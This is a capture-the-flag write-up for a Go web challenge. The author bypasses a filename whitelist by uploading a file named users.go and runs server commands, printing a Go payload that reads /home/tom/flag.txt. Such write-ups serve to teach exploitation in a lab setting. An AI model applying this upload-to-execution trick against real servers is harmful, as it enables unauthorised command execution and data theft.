# Shortcuts (465pts) #

![TASK](https://imgur.com/eBGWBx5.png)

We are given a simple web app written in Golang where we have shortcuts for some commands executed on the server, after digging around we can notice that the server is returning the output of go run FILE.go ( by having a look at processes)
so if we upload our go script that executes any commands for us we can achieve a command execution :D But that's not the case if we try to upload any file it won't be executed , i think that there's a whitelist of the accepted filenames.

If we try to execute the users shortcuts we will get the error below , so if we upload a file named users.go and then click users, our script will be executed and we will bypass this whitelist 

![IMAGE](https://imgur.com/bjkx19l.png)

After uploading it :

![SUCCESS](https://imgur.com/Dzm006Q.png)

The content of **users.go** file :

```go

package main

import (
    "fmt"
    "os/exec"
)

func execute() {

    out, err := exec.Command("cat","/home/tom/flag.txt").Output()

    if err != nil {
        fmt.Printf("%s", err)
    }

    fmt.Println("Command Successfully Executed")
    output := string(out[:])
    fmt.Println(output)
}

func main() {
        execute()

}

```

If you have any questions you can DM on twitter @belkahlaahmed1 or visit my website for more interesting content and blogs https://ahmed-belkahla.me
